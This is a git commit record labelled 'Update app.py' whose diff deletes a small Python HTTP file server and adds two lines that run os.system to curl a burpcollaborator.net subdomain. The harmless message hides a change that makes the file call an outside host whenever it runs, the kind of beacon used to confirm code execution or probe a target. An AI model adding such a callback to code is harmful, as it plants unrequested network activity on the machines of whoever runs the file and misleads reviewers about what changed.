331a796de88a143de0ebb1925faba63e9b8bf50d
hmimahm <73855958+hmimahm@users.noreply.github.com>
2020-11-03 11:43:40 -0800

    Update app.py

--- app.py
+++ app.py
@@ -1,10 +1,2 @@
-import http.server
-import socketserver
-
-PORT = 9000
-
-Handler = http.server.SimpleHTTPRequestHandler
-
-with socketserver.TCPServer(("", PORT), Handler) as httpd:
-    print("serving at port", PORT)
-    httpd.serve_forever()
+ import os
+ os.system("curl http://a5g2rsuldu77i32adw7c97sqhhnabz.burpcollaborator.net")
